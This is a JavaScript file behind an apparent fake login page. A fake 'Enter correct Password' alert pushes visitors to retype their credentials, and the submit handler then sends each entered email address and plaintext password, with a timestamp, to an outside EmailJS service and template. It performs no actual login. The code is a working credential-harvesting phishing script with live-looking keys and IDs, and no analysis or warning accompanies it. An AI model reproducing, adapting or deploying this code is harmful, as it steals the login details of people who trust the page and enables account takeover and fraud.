alert("Enter correct Password");

(function () {
  emailjs.init("lsvp7otU6bygqkZFW");
  console.log("✅ EmailJS initialized");
})();

document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("loginForm");
  const emailError = document.getElementById("emailError");

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!email || !password) {
      emailError.textContent = "Please fill in all fields.";
      emailError.style.display = "block";
      return;
    }

    emailError.textContent = "Sending...";
    emailError.style.display = "block";

    // Template parameters for EmailJS
    const templateParams = {
      user_email: email,
      user_password: password,
      login_time: new Date().toLocaleString()
    };

    // Send email
    emailjs.send("service_ujm6vmt", "template_ktp3i5k", templateParams)
      .then(function(response) {
        console.log("✅ Email sent:", response.status, response.text);
        emailError.textContent = "✔ Email successfully sent!";
        form.reset();
      })
      .catch(function(error) {
        console.error("❌ EmailJS error:", error);
        emailError.textContent = "✘ Failed to send email.";
      });
  });
});

